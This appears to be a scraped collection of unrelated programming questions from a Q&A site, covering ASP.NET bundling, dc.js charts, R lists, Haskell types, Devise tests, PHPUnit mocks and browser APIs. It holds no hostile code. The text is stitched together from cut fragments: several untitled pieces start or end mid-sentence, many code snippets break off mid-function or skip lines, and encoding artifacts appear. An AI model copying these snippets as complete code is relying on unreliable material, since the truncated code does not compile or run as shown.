        <add namespace="System.Web.Optimization"/>
        ...
      </namespaces>
    </pages>
</system.web>
 Added the following to the head element of my MVC layout file:  @Styles.Render("~/bundles/styles/cvi")
 Copied the CSS file referenced in BundleConfig ("mainstyles.css") into the root directory of my web project. When I view the source of a rendered file, I can see the link appears as: <link href="/bundles/styles/cvi" rel="stylesheet"/>
 This link results in a 404 when browsing to it, or viewing the page request in Chrome's network tab. I have also tried the equivalent on a web form, but I get the same result (404) from the link generated when I add: <%: Styles.Render("~/bundles/styles/cvi") %>

@TITLE:Using an ordinal scale ('d3.scale.ordinal') for the x-axis in a bar chart
@CONTENT:I have a data array like this: var data = [{"Alphabet_Type":"a"}, {"Alphabet_Type":"b"}, {"Alphabet_Type":"a"}];
 I am using: dc.js crossfilter.js d3.js I want to create a bar chart with: the x-axis having an alphabet name, and the y-axis having number of occurrences of the alphabet. Question: How can I plot a bar chart with an ordinal scale on the x-axis? My code: var data = [{"Alphabet_Type":"a"}, {"Alphabet_Type":"b"}, {"Alphabet_Type":"a"}];

var Filter = crossfilter(data);
var Dimension = Filter.dimension(function (d) { return d.Alphabet_Type; });
var Group = Dimension.group();

dc.barChart("#bar-chart")
    .width(800) 
    .height(275) 
    .transitionDuration(0) 
    .margins({ top: 10, right: 50, bottom: 30, left: 40 })
    .dimension(Dimension) 
    .group(Group) 
    .elasticY(false)
    .elasticX(false)

    .centerBar(true)
    .renderHorizontalGridLines(true)
    .renderVerticalGridLines(true)
    .brushOn(false);
 Finally, I have another problem which is that Alphabet_Type is not going to have predictable values. So I need to fetch the values for Alphabet_Type via crossfilter.js and incorporate those values into the domain. How can I do this?
@CODE:var data = [{"Alphabet_Type":"a"}, {"Alphabet_Type":"b"}, {"Alphabet_Type":"a"}]; var data = [{"Alphabet_Type":"a"}, {"Alphabet_Type":"b"}, {"Alphabet_Type":"a"}];

var Filter = crossfilter(data);
var Dimension = Filter.dimension(function (d) { return d.Alphabet_Type; });
var Group = Dimension.group();

    .width(800)

@LINK:/questions/16129068/what-is-the-internal-implementation-of-lists
@TITLE:What is the internal implementation of lists?
@CONTENT:I am curious how an object of type list is implemented. Is it a dynamic vector that will automatically increase its size when it is full. a linked list where appending an item is O(1), but accessing an item is O(n). a tree structure with O(log(n)) item access. a hashtable with O(1) item access. I am curious because lists can have key-value pairs that make them look like hash tables, but the elements are in order, which looks like a vector. Edit: because length(list(runif(1e4))) is 1, so when append element to a list, it looks like that it copy the whole list every time, that makes it very slow: But the access speed is much slower than a vector: z1 <- runif(1e4)
system.time({
  for(i in 1:10000) z1[[1 + i]] <- 1
})
 outputs: user  system elapsed 
0.060   0.000   0.062 
 but: z1 <- list(runif(1e4))
system.time({
  for(i in 1:10000) z1[[1 + i]] <- 1
})
 outputs: user  system elapsed 
1.31    0.00    1.31 
 init a list with 10000 elements: z1 <- as.list(runif(1e4))
system.time({
  for(i in 1:10000) z1[[1 + i]] <- 1
})
 outputs: user  system elapsed 
0.060   0.000   0.065 
 For the key & value access: z1 <- list()
for(i in 1:10000){key <- as.character(i); z1[[key]] <- i} 
system.time({
  for(i in 1:10000) x <- z1[["1"]]
})
system.time({
  for(i in 1:10000) x <- z1[["10000"]]
})
 The output is: user  system elapsed 
0.01    0.00    0.01 
user  system elapsed 
1.78    0.00    1.78 
 It's not an O(1) access, so it's not a hash table. My conclusion is that it's not a dynamic array since appending items will cause memory accesses every time; it's not a hashtable since access by key is not O(1).
@CODE:list O(1) O(n) O(log(n)) O(1) length(list(runif(1e4))) z1 <- runif(1e4)
system.time({
  for(i in 1:10000) z1[[1 + i]] <- 1

        $this->bootstrap('Config');
        $options = $this->getOptions();
        $mail = new Zend_Application_Resource_Mail($options['mail']);

    return $mail;

 You can see the closure that lies with in. When I run any tests that use this code I get: Exception: Serialization of 'Closure' is not allowed 
 and thus all the tests in relation to this "closure" fails. So I am here asking you guys what I should do. For clarification on the above, all were doing is saying that any email we send out we want to store information about that email in a folder in the /tmp/mail/ directory in a file.

    }elseif ('testing'  ===  APPLICATION_ENV) {
        //change the mail transport only if dev or test
        if (APPLICATION_ENV <> 'production') {

            $callback = function()

@TITLE:How to extend knockout observables to read default value from binding?
@CONTENT:I have finally found the time to start learning KnockoutJS while building a new MVC4 application. I am trying to figure out the best way to initialize an observable value from a default value that is already set in the view. This is a contrived example, but I would like to render out a default value for an observable directly to the view as follows: <input type="hidden" 
       value="@Model.SomeValue"
       data-bind="value: myObservableReference"/>
 I know that a default value is normally initialized via: model.myObservableReference = ko.obervable("SomeValue");
 However, I would like to find a way to extend the initialization such that: model.myObservableReference = ko.obervable();
 would read the existing value from the binding if a value exists. As I have so far managed to keep my KnockoutJS code completely unaware of the razor world, I want to to avoid the sloppiness of: model.myObservableReference = ko.obervable(@Model.SomeValue);
 I am guessing this would be handled via either an extender or custom binder, but if someone could point me in the right direction it would be greatly appreciated.
@CODE:<input type="hidden" 
       value="@Model.SomeValue"
       data-bind="value: myObservableReference"/> model.myObservableReference = ko.obervable("SomeValue"); model.myObservableReference = ko.obervable(); model.myObservableReference = ko.obervable(@Model.SomeValue);

@TITLE:How to prevent Meteor from watching files?
@CONTENT:I would like to use Dojo Toolkit with Meteor. I first copy the whole Dojo Toolkit tree in /public Then, I include it on the client side with: <script src="/dojo/dojo.js" data-dojo-config="async: true"></script>`
 Everything works fine, except Meteor is actually monitoring every single file in /public for changes, so that it can restart the server. This is actually causing a very long delay during the first request on localhost:3000. Is there a way of preventing Meteor from watching files from a certain directory? Dojo Toolkit is 10k+ files so I get the EMFILE error stated here, corrected with sudo sh -c 'echo 16384 > /proc/sys/fs/inotify/max_user_watches'

@TITLE:NumberFormatException on valid number String
@CONTENT:I have seen some other questions about this but the errors were related to a leading 0 in the string. This unfortunately is not my case. I am receiving encrypted data from an external source in base64 format, I then decode it (using an included Base64 library because the android sdk version is 7), decrypt the message, and after all that I have a simple string in a number format. When I try to cast it to Long or Integer I get this error: java.lang.NumberFormatException: Invalid long: "2551122"

 To check the input I used prints and it really is the string "2551122". When I try to check for equality, it is also not correct "2551122".equals(numberAsString) // Gives me false
 I thought it was an encoding issue and tried taking the decoded bytes and creating strings in several encodings, also tried to decode the bytes from the base64 string with these same several encodings and still have no idea of what is causing this error. Please any help is appreciated UPDATE This is the code for decrypting the string (Encryptor class): private static byte[] decrypt(byte[] raw, byte[] encrypted) throws Exception {
    SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
    Cipher cipher = Cipher.getInstance(encryptionAlgorithim);
    cipher.init(Cipher.DECRYPT_MODE, skeySpec, new IvParameterSpec(iVector));
    byte[] decrypted = cipher.doFinal(encrypted);
    return decrypted;

    byte[] decoded = Base64.decode(encryptedString); // Decodes the string from base64 to byte[]
    byte[] result = decrypt(keyBytes, decoded);
    return new String(result);
}
 This is how the error is raised: Encryptor encryptor = new Encryptor();

 anything and everything I can find to do with the HStore column all I really use HStore for is for a search on specific tickers. This used to work... I don't know what changed. I might have upgraded Postgres (I was fiddling around with homebrew) or potentially something changed with rails. I did try going back to 3.2.3 but I got the same error. def self.find_by_hstore(search_key, search_value)

  weights.each_pair {|ticker, weight| self.data[ticker.to_s] = weight}

@LINK:/questions/10711767/is-selectedoptions-broken-or
@TITLE:Is selectedOptions broken or¡K?
@CONTENT:Note: this question has nothing to do with Knockout.js, but it's about the selectedOptions attribute of <select> elements instead. This is the reference: http://www.whatwg.org/specs/web-apps/current-work/multipage/the-button-element.html#dom-select-selectedoptions I think it's a nice feature for Javascript developers. The support is quite limited, but it's growing anyway. Chrome, Opera and Safari should already support it. The problem is that I can't figure out how it works. The behaviour should be quite straightforward, yielding a live collection of the selected options, but it turns out to be not the case. You'd imagine that selectedOptions changes everytime the user selects an option, right? Wrong. I've prepared a test case: http://jsfiddle.net/f39cC/5/ In this example, Opera 11.64 always returns the first value selected, no matter what you do after, while Chrome 21 dev and 19 stable have an odd behaviour. Do the following steps: Select 'One'. In both output and console you get "One", as expected. Select 'Two' too, using Ctrl. In console you get "One,Two", in output it's still "One". Select 'Three' too. In console it's "One,Two,Three", in output it's "One,Two". Now select 'Two' only. In console you get "Two", in output "Two,," (notice the two commas). However, if you comment out the console.log line, you always get the correct output. You can get the expected behaviour in both console and output if you swap the two instructions, or if you store the value in a separated string, as in this: http://jsfiddle.net/f39cC/2/ So, am I missing something about selectedOptions? Is it too soon to rely on this property, that probably has a buggy implementation? Is console.log creating the issue in Chrome? Is there something I don't know about HTMLCollections? I don't have Safari installed, can someone check its behaviour? UPDATE 18/2/2013: I don't know when things have changed, but both Chrome 24.0.1312.57 and Opera 12.14 seems to work fine now. Firefox 18.0.2 and Internet Explorer 10 still have to implement the property. UPDATE 17/9/2013: Firefox 24 and IE 11 preview still have to support the property. This is an easy workaround for Firefox and IE8-11: Object.defineProperty(HTMLSelectElement.prototype, "selectedOptions", {
    get: (function() {
        try {
            document.querySelector(":checked");
            return function() {
                return this.querySelectorAll(":checked");
            };
        } catch (e) {
            return function() {
                if (!this.multiple) {
                    return this.selectedIndex >= 0
                            ? [this.options[this.selectedIndex]] : [];
                }
                for (var i = 0, a = []; i < this.options.length; i++)
                    if (this.options[i].selected) a.push(this.options[i]);
                return a;
            };
        }
    })()
});
 For IE8 it returns just an Array and not a NodeList, though. UPDATE 28/5/2014: It looks like Firefox started implementing selectedOptions since r25.
@CODE:selectedOptions <select> selectedOptions console.log selectedOptions console.log HTMLCollection Object.defineProperty(HTMLSelectElement.prototype, "selectedOptions", {
    get: (function() {
        try {
            document.querySelector(":checked");
            return function() {
                return this.querySelectorAll(":checked");
            };

                if (!this.multiple) {
                    return this.selectedIndex >= 0

@TITLE:Python extending with - using super() python 3 vs python 2
@CONTENT:Originally I wanted to ask this question, but then I found it was already thought of before ... Googling around I found this example of extending configparser. The following works with python 3: $ python3
Python 3.2.3rc2 (default, Mar 21 2012, 06:59:51) 
[GCC 4.6.3] on linux2
>>> from configparser import  SafeConfigParser
>>> class AmritaConfigParser(SafeConfigParser):
...     def __init_(self):
...         super().__init__()
... 
>>> cfg = AmritaConfigParser()
 But not with python2: >>> class AmritaConfigParser(SafeConfigParser):
...       def __init__(self):
...           super(SafeConfigParser).init()
... 
>>> cfg = AmritaConfigParser()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 3, in __init__
TypeError: must be type, not classob
 Then I read a little bit on Python New Class vs. Old Class styles (e.g. here. And now I am wondering, I can do: class MyConfigParser(ConfigParser.ConfigParser):
      def Write(self, fp):
          """override the module's original write funcition"""
          ....
      def MyWrite(self, fp):
          """Define new function and inherit all others"""
 But, shouldn't I call init? Is this in python 2 the equivalent:  class AmritaConfigParser(ConfigParser.SafeConfigParser):
    #def __init__(self):
    #    super().__init__() # Python3 syntax, or rather, new style class syntax ...
    #
    # is this the equivalent of the above ? 
    def __init__(self):
        ConfigParser.SafeConfigParser.__init__(self)
 Thanks in advance for helping me clear things out.

 I'm really confused. The WITH clause appears correct per Postgres documentation. If I separately run the query in the WITH clause, I get correct results.

 I've read through other threads on here, but couldn't find a direct answer, as most were much more complicated. EDIT: I looked at best way to stop sql-injection in php, but I'm a bit confused on how to modify this: $preparedStatement = $db->prepare('INSERT INTO table (column) VALUES (:column)');

$preparedStatement->execute(array(':column' => $unsafeValue));
 Assuming I used the html form above and wanted to insert the data from field 'firstname' into the database, should it look like this? Or am I supposed to modify column?: $preparedStatement = $db->prepare('INSERT INTO table (column) VALUES (:column)');

$preparedStatement->execute(array(':column' => $firstname));

That is std::vector<std::reference_wrapper<MyClass> > vs. std::vector<MyClass*> I like forgetting about nulls and not having to use pointer syntax, but the verbosity of the types (i.e. vector<reference_wrapper<MyClass> >) plus having the call site use std::ref to wrap the actual reference makes me think it is not worth it. I am referring to cases in which using std::shared_ptr or any other smart pointer is not an option. Are there other benefits of using reference_wrapper or any other factors I am currently not taking into account? (I think my question applies to both C++11's reference_wrapper and boost's)

@LINK:/questions/8672620/out-of-context-variables-in-visual-studio-2010-debugger
@TITLE:Out Of Context Variables In Visual Studio 2010 Debugger
@CONTENT:I am having a very odd problem with local variables being out of context in the Visual Studio 2010 debugger for a C# console application targeting .NET 4.0. I've searched for other similar questions on SO, but while some have the same symptoms, none seem to apply directly to this problem (they all appear to have other root causes). The problem is that for some variables (but not all) I do not get a tooltip with their value, they do not appear in the Locals window, and I get "The name 'xyz' does not exist in the current context" if I add them to the Watch window. It appears to affect some variables but not others, and I can't figure out a pattern (it doesn't seem to be based on member vs. local, class vs. struct, or any other differentiator). I've restarted my computer and Visual Studio, verified I'm in a clean Debug build, made sure the debugging frame is correct, made sure to refresh the variables in the watch screen, and attempted various spells and incantations. I've included a screenshoot below (bigger version at http://i.stack.imgur.com/JTFBT.png). Any thoughts? EDIT: Adding some additional information: The problem is repeatable. The exact same variables either work or don't work, even after completely shutting down and restarting Visual Studio. This leads me to believe there's actually something systematic going wrong rather than just memory corruption or something. I've also discovered that it appears to be related to the try-catch block. If I position the breakpoint outside the try statement I can see any of the in-scope variables normally. As soon as the execution point enters the try statement all the variables outside the try block become inaccessible and I can only access the ones inside the try statement. It's almost as though the debugger is treating the try block as a separate method (though you can see the code/compiler still does have access to in-scope variables). Has anyone seen this behavior before? ANOTHER EDIT: I (partially) take back what I said about the try-catch being suspect - it appears that in this portion of the code the debugger exhibits this odd taking stuff out of context for any enclosing block. For example, if I set a breakpoint directly inside the foreach statement in the screenshot I can see the "port" variable value on each iteration, but none of the variables outside the foreach statement (which disappear as soon as I enter the foreach block). Then as soon as you enter the try block, the "port" variable suddenly goes away. This is getting really weird. Also, as requested, the code for the entire method is below. private void ConfigureAnnouncerSockets(XDocument configDocument)
{
    XElement socketsElement = configDocument.XPathSelectElement("/Configuration/Network/AnnouncerSockets");

@TITLE:Type error with rank-2 types and function composition
@CONTENT:Here are some pragmas and some imports: {-# LANGUAGE ScopedTypeVariables #-}

import Control.Monad.ST
import Data.Array.ST
import Data.Array
 Now here's my problem. The following code typechecks: foo :: forall a. a -> [a]
foo x = elems $ runSTArray $ do
    newListArray (1,10) (replicate 10 x) :: ST s (STArray s Int a)
 However, when I replace the $ with composition: foo :: forall a. a -> [a]
foo x = elems . runSTArray $ do
    newListArray (1,10) (replicate 10 x) :: ST s (STArray s Int a)
 I get this error: Couldn't match expected type `forall s. ST s (STArray s i0 e0)'
            with actual type `ST s0 (STArray s0 Int a)'
In the expression:
    newListArray (1, 10) (replicate 10 x) :: ST s (STArray s Int a)
In the second argument of `($)', namely
  `do { newListArray (1, 10) (replicate 10 x) ::
          ST s (STArray s Int a) }'
In the expression:
      elems . runSTArray
  $ do { newListArray (1, 10) (replicate 10 x) ::
           ST s (STArray s Int a) }
 What's werid is, if I give the function composition its own name, then it typechecks again: elemSTArray = elems . runSTArray

foo :: forall a. a -> [a]
foo x = elemSTArray $ do
    newListArray (1,10) (replicate 10 x) :: ST s (STArray s Int a)
 I'm not sure what's going on here. I would expect the second piece of code to typecheck nicely. And I don't understand why it typechecks again if I give the composed function its own name. This is a simplified version of some code that I had that broke when upgrading from GHC 6.2 to 7 and I'm trying to understand why this happens now. Thanks for helping!

@TITLE:How do I use Google's ¡§Simple API Access key¡¨ to access Google Calendar info (PHP)?
@CONTENT:I'm trying to use the Google API v3 to access one google calendar and according to the documentation here : http://code.google.com/apis/calendar/v3/using.html#intro and here : https://code.google.com/apis/console/, the solution I need is the "Simple API Access" & "Key for server apps (with IP locking)". Now, when I create a page with this code : session_start();

require_once 'fnc/google-api-php-client/src/apiClient.php';
require_once 'fnc/google-api-php-client/src/contrib/apiCalendarService.php';

$apiClient = new apiClient();
$apiClient->setUseObjects(true);
$service = new apiCalendarService($apiClient);

if (isset($_SESSION['oauth_access_token'])) {$apiClient->setAccessToken($_SESSION['oauth_access_token']);
} else {
    $token = $apiClient->authenticate();
    $_SESSION['oauth_access_token'] = $token;
}
 and in my "config.php" file I add ONLY my developper key (in place of the "X") : global $apiConfig;
$apiConfig = array(
    // True if objects should be returned by the service classes.
    // False if associative arrays should be returned (default behavior).
    'use_objects' => false,

    // The application_name is included in the User-Agent HTTP header.
    'application_name' => '',

    // OAuth2 Settings, you can get these keys at https://code.google.com/apis/console
    'oauth2_client_id' => '',
    'oauth2_client_secret' => '',
    'oauth2_redirect_uri' => '',    

    // The developer key, you get this at https://code.google.com/apis/console
    'developer_key' => 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXX',

    // OAuth1 Settings.
    // If you're using the apiOAuth auth class, it will use these values for the oauth consumer key and secret.

    'oauth_consumer_key'    => 'anonymous',
    'oauth_consumer_secret' => 'anonymous',
 But then I get errors and it tells me it's trying to authenticate using the "OAuth 2.0" system which I don't want to use. I only want to access one calendar with an API key. And amazingly, when I search in google "Simple API Access key" I find nothing, nothing on their docs, no examples, no tutorials, nothing. Am I the only one using this thing? So can someone tell me what I'm doing wrong?

@TITLE:Should I use virtual 'Initialize()' functions to initialize an object of my class?
@CONTENT:I'm currently having a discussion with my teacher about class design and we came to the point of Initialize() functions, which he heavily promotes. Example: class Foo{
public:
  Foo()
  { // acquire light-weight resources only / default initialize
  }

  virtual void Initialize()
  { // do allocation, acquire heavy-weight resources, load data from disk
  }

  // optionally provide a Destroy() function
  // virtual void Destroy(){ /*...*/ }
};
 Everything with optional parameters of course. Now, he also puts emphasis on extendability and usage in class hierarchies (he's a game developer and his company sells a game engine), with the following arguments (taken verbatim, only translated): Arguments against constructors: can't be overridden by derived classes can't call virtual functions Arguments for Initialize() functions: derived class can completely replace initialization code derived class can do the base class initialization at any time during its own initialization I have always been taught to do the real initialization directly in the constructor and to not provide such Initialize() functions. That said, I for sure don't have as much experience as he does when it comes to deploying a library / engine, so I thought I'd ask at good ol' SO. So, what exactly are the arguments for and against such Initialize() functions? Does it depend on the environment where it should be used? If yes, please provide reasonings for library / engine developers or, if you can, even game developer in general. Edit: I should have mentioned, that such classes will be used as member variables in other classes only, as anything else wouldn't make sense for them. Sorry.

@CONTENT:I have been using nunit with visual studio 2010 on a windows 7 64-bit pc. I am able to open the nunit gui and run my unit tests. If I then change one of the unit tests and try to rebuild, I am getting a file locking error as follows - Error 1 Unable to copy file "obj\Debug\myProject.Tests.dll" to "bin\Debug\myProject.Tests.dll". The process cannot access the file 'bin\Debug\myProject.Tests.dll' because it is being used by another process. myProject.Tests I have used process explorer to verify that it is the nunit-agent.exe that is locking the dll. I have noticed via tools > test assemblies that the nunit.exe is running under clr version Net 2.0 and nunit-agent.exe is running under clr version Net 4.0. could that have something to do with the problem? If so, how can I fix it? If not, does anyone have any idea what else may be going on? Thanks for any thoughts.

@TITLE:create dependency between windows services startup
@CONTENT:I have created a windows service which is set to start automatically. This service connects to the database service on startup. The issue is the database service seems to start after my service. Is there is a programmatic way to define this dependency so that my service starts after the database service has started. I found this article http://www.boyce.us/windows/servertipcontent.asp?ID=7 which talks about adding a registry entry to do that. I would like to know if there is a C# way to do this? Update: Adding to the above question. Here is another scenario. The services are being installed using installshied which does not need a projectinsaller. It seems installshield looks for classes deriving from ServiceBase class and installs each service. How to add the dependency in such a scenario?

@TITLE:RSpec Test of Custom Devise Session Controller Fails with AbstractController::ActionNotFound
@CONTENT:I am currently trying to test a custom Devise session controller with rspec. My controller looks like this: class SessionsController < Devise::SessionsController

  def create 
    #valid email?
    if !(params[:email] =~ /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/)
      set_flash_message :notice, "Please enter a valid e-mail address!"
    end

    super
  end
end
 My RSpec Controller Test is this: require 'spec_helper'
require 'devise/test_helpers'

describe SessionsController do  

  it "should put a warning on invalid mail address login attempt" do
    post :create, :user => {:email => 'invalidEmailAddress'}
    response.should contain "Please enter a valid e-mail address!"
  end

  it "should put no warning on valid mail address login attempt" do
    pending
  end
end
 If I execute the RSpec Test it fails with the following line: Failure/Error: post :new, :user => {:email => 'invalidEmailAddress'}
     AbstractController::ActionNotFound
     # ./spec/controllers/sessions_controller_spec.rb:7
 Tips from the plataformatec Devise Wiki as well as this post did not solve this issue. Thanks for your help. Addition I investigated further. I was actually able to "remove" the error with the following addition to the controller spec: before(:each) do
  request.env['devise.mapping'] = Devise.mappings[:user]
end
 But now a new error appears: Failure/Error: post :create  #currently fails with multiple render warning
Render and/or redirect were called multiple times in this action. Please note that you may only call render OR redirect, and at most once per action. Also note that neither redirect nor render terminate execution of the action, so if you want to exit an action after redirecting, you need to do something like "redirect_to(...) and return".
 Even with the create method left out in the inheriting controller the error appears. The error does not appear on get :new for example. It seems to be post :create only. I am out of ideas? Any help? Thanks!

 Currently, when I try to initialize the reference in B, I am using Method 1. However, Method 1 will flag me warning which is understandable. Hence, I have to fall back using Method 2, by using dynamic memory allocation. Is there any better way I can use, without the need of manual memory allocation/ dellocation (OK. I know smart pointer)? I prefer Method 1, just that I am not comfortable with the warning.

@TITLE:How to sort three variables using at most two swaps?
@CONTENT:The following algorithm can sort three variables x, y and z of type K which are comparable using operator<: void sort2(K& x, K& y) {
   if(y < x)
      swap(x, y);
}      

void sort3(K& x, K& y, K& z) {
   sort2(x, y);
   sort2(y, z);
   sort2(x, y);
}
 This needs three swaps in the "worst case". However basic mathematics tells us, that the ordering of three values can be done using only two swaps. Example: The values (c,b,a) will be sorted using three swaps: (c,b,a) -> (b,c,a) -> (b,a,c) -> (a,b,c). However one swap would have been enough: (c,b,a) -> (a,b,c). What would be the simplest algorithms which sorts three variables with at most two swaps in all cases?
@CODE:x y z K operator< void sort2(K& x, K& y) {
   if(y < x)
      swap(x, y);
}      

void sort3(K& x, K& y, K& z) {
   sort2(x, y);

   sort2(x, y);

@TITLE:When is an autoreleased object actually released?
@CONTENT:I am new in objective-c and I am trying to understand memory management to get it right. After reading the excellent Memory Management Programming Guide for Cocoa by apple my only concern is when actually an autoreleased object is released in an iphone/ipod application. My understanding is at the end of a run loop. But what defines a run loop in the application? So I was wondering whether the following piece of code is right. Assume an object @implementation Test

- (NSString *) functionA {
    NSString *stringA;
    stringA = [[[NSString alloc] initWithString:@"Hello"] autorelease]
    return stringA;
}

- (NSString *) functionB {

    return stringB;
}

- (NSString *) functionC {

    stringC = [self functionB];
    return stringC;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    NSString* p = [self functionC];
    NSLog(@"string is %@",p);
}

@end
 Is this code valid? From the apple text I understand that the NSString returned from functionA is valid in the scope of functionB. I am not sure whether it is valid in functionC and in viewDidLoad. Thanks!
@CODE:@implementation Test

- (NSString *) functionA {
    NSString *stringA;
    stringA = [[[NSString alloc] initWithString:@"Hello"] autorelease]

    NSString *stringB;
    stringB = [self functionA];
    return stringB;
}

$stub = $this->getMock('MyStubClass', array(), array(), 'MockMyStubClass', false, false, false);
$stub->expects($this->any())
     ->method('mrMethod')
     ->will($this->returnValue('doing stuff'));
 But upon invoking the stubbed method, I get an exception: $stub->mrMethod();
//PHP Fatal error:  Call to undefined method MockMyStubClass::mrMethod()
 I'm using PHPUnit 3.4.3 with PHP 5.3.0. Another small thing I noticed was that if specifying a namespace in the getMock() method results in a class loading exception because of a double namespace: $stub = $this->getMock('MyApp\MyStubClass');
// Fatal error:  Class 'MyApp\MyApp\MyStubClass' not found
 That strikes me as rather odd (and getmock() will not accept a namespace with a leading backslash). The only thing I could think to cause that would may be because this class is registered with an autoloader? Any thoughts?
@CODE:namespace MyApp;

class MyStubClass 
{
   public function mrMethod()
   {
     // doing stuff
   }   
} // specifying all getMock() args to disable calling of class __construct()
$stub = $this->getMock('MyStubClass', array(), array(), 'MockMyStubClass', false, false, false);
$stub->expects($this->any())
     ->method('mrMethod')
     ->will($this->returnValue('doing stuff')); $stub->mrMethod();
//PHP Fatal error:  Call to undefined method MockMyStubClass::mrMethod() getMock() $stub = $this->getMock('MyApp\MyStubClass');
// Fatal error:  Class 'MyApp\MyApp\MyStubClass' not found

@LINK:/questions/1099569/how-to-convert-colors-from-one-color-space-to-another
@TITLE:How to convert colors from one color space to another?
@CONTENT:Is there a Cocoa Touch way to convert colors from one color space to another? At the end of this code: UIColor *grey = [UIColor colorWithWhite: 0.5 alpha: 1.0];
CGColorRef greyRef = [grey CGColor];
int x = CGColorGetNumberOfComponents(greyRef);
 ...x is 2. The reason I need this is I'm trying to copy colors to a list of color components for CGGradientCreateWithColorComponents, which needs all colors in a single colorspace. The problem is that grey is in the grayscale colorspace, rather than the RGB one. (The name escapes me at the moment, but it isn't important.) CGGradientRef createGradient(NSInteger inCount, NSArray* inColors, CGFloat* inLocations) {
 CGColorSpaceRef theColorspace = CGColorSpaceCreateDeviceRGB( );
 size_t numberOfComponents = 4;
 NSInteger colorSize = numberOfComponents * sizeof( CGFloat );
 CGFloat *theComponents = malloc( inCount * colorSize );
 CGFloat *temp = theComponents;
 for ( NSInteger i = 0; i < inCount; i++ ) {
  UIColor *theColor = [inColors objectAtIndex: i];
  CGColorRef cgColor = [theColor CGColor];
  const CGFloat *components = CGColorGetComponents( cgColor );
  memmove( temp, components, colorSize );
  temp += numberOfComponents;
 }
 CGGradientRef gradient = CGGradientCreateWithColorComponents( theColorspace,
                                               theComponents, inLocations, inCount );
 CGColorSpaceRelease( theColorspace );
 free( theComponents );
 return gradient;
}
 I know I can look for colors in the greyscale color space and convert them. But that only solves one case. From looking at this question, I think HSB is handled as well. But I'd like to write some code here and never think about it again, which means supporting not just the color spaces that are there now but anything Apple could conceivably add in the future. Am I out of luck?
@CODE:UIColor *grey = [UIColor colorWithWhite: 0.5 alpha: 1.0];
CGColorRef greyRef = [grey CGColor];
int x = CGColorGetNumberOfComponents(greyRef); x CGGradientCreateWithColorComponents CGGradientRef createGradient(NSInteger inCount, NSArray* inColors, CGFloat* inLocations) {
 CGColorSpaceRef theColorspace = CGColorSpaceCreateDeviceRGB( );
 size_t numberOfComponents = 4;
 NSInteger colorSize = numberOfComponents * sizeof( CGFloat );
 CGFloat *theComponents = malloc( inCount * colorSize );
 CGFloat *temp = theComponents;
 for ( NSInteger i = 0; i < inCount; i++ ) {
  UIColor *theColor = [inColors objectAtIndex: i];
  CGColorRef cgColor = [theColor CGColor];
  const CGFloat *components = CGColorGetComponents( cgColor );
  memmove( temp, components, colorSize );
  temp += numberOfComponents;
 }
 CGGradientRef gradient = CGGradientCreateWithColorComponents( theColorspace,
                                               theComponents, inLocations, inCount );
 CGColorSpaceRelease( theColorspace );

Edit: Also, a lot of the fields are option-type sort of things (like on a request form, would you like your widget to be yellow or green, he has a field for 'colour' with an enum). It's quite likely that these will be added to or removed over time.

@CONTENT:Maybe I'm doing something odd, but maybe found a surprising performance loss when using numpy, seems consistent regardless of the power used. For instance when x is a random 100x100 array x = numpy.power(x,3)

 A plot of the speed up for various array sizes reveals a sweet spot with arrays around size 10k and a consistent 5-10x speed up for other sizes. Code to test below on your own machine (a little messy): import numpy as np
from matplotlib import pyplot as plt
from time import time

ratios = []
sizes = []
for n in np.logspace(1,3,20).astype(int):
    a = np.random.randn(n,n)

        t = time()
        b = a*a*a
        inline_times.append(time()-t)
    inline_time = np.mean(inline_times)

    pow_times = []
    for i in range(100):

@TITLE:Java process memory check test
@CONTENT:I tried to see how XMX and XMS parameters impact on my program and check how much memory does my process consume. I wrote a simple program but am not able to reason out the results. Kindly help. public static void main( String[] args ) {
        char[] array = new char[69926904];
}
 I ran with parameters -Xms5M -Xmx200M. Ideally, since a character takes 2 bytes, it should hold 100M characters before exceeding the memory limit. Even if we say, few space is getting used for pointer and length, I don't know, why it is throwing error after 69926904 length. Thanks.

 I notice the messages are complaining about different objects. I searched SO and the Web and tried a few different things but to no avail. I don't have a recent backup copy. Cloning the repository into another directory doesn't help; the new repository exhibits the exact same problems. git stash gives the same message as git commit. All the other git commands seem to work normally. How can I tell what is wrong and fix it?

 *WebSecurity.Login* is working on all browsers when i call the login method using Ajax. But I have another method in another controller, That named as CurrentDateAndUser Code: [AllowAnonymous]
[System.Web.Http.AcceptVerbs("Get")]
[System.Web.Http.HttpGet]
public HttpResponseMessage CurrentDateAndUser()
{
    if (WebSecurity.IsAuthenticated)
    {
        int userId = WebSecurity.CurrentUserId;
        string[] currentDateAndUSerId = new string[2];
        currentDateAndUSerId[0] = userId.ToString();
        currentDateAndUSerId[1] = DateTime.UtcNow.ToString();

        HttpResponseMessage response =

        return response;
    }
    HttpResponseMessage responseNew =
        Request.CreateResponse(HttpStatusCode.NotAcceptable);
    return responseNew;
}
 Issue: If I call the CurrentDateAndUser method from Microsoft Internet Explorer Using an Ajax call, then everything works. The WebSecurity.IsAuthenticated returns true and is working well. However, If I call the CurrentDateAndUser method from Google Chrome Or Mozilla Firefox using an Ajax call, then nothing works. The WebSecurity.IsAuthenticated always returns false. I don't know why. If you have any idea, then please let me know. I also found a similar problem (not sure if it is a real issue): When I run my application with Fiddler, I see a different result: When i call the CurrentDateAndUser method from IE, the request is: I can see the Cooke/Login values in above image But When i call the CurrentDateAndUser method from Chrome And Firefox , the request is: I can't see the cookie values, meaning that the Web Security.IsAuthenticated property is returning false. Is it Bug in WebSecurity????? Edit My Ajax request code is function GetCurrentUserId() { 
    return $.ajax({
        method: 'GET',
        url: rootUrl + '/api/Common/CurrentDateAndUser',
        async: false

        return response[0];

    }).error(function () {
        toastr.error('Somthing is wrong', 'Error');
    })
}
 This request does not send the Auth Cookie values to Web API method when I run the application in Chrome and Firefox, however, this request sends the cookie values to the API method, if it is run in IE i have posted the Image , Please take a look at the above image

@TITLE:HTML5 Microphone capture stops after 5 seconds in Firefox
@CONTENT:I'm capturing audio input from microphone with getUserMedia() function, works fine in chrome, but in firefox sound dies out after 5 seconds. If I send request for microphone again (without reloading the page) same thing happens. Here is the code (I used http://updates.html5rocks.com/2012/09/Live-Web-Audio-Input-Enabled as guidance): //getting the function depending on browser

navigator.getMedia = ( navigator.getUserMedia ||

// success callback when requesting audio input stream
function gotAudioStream(stream) {
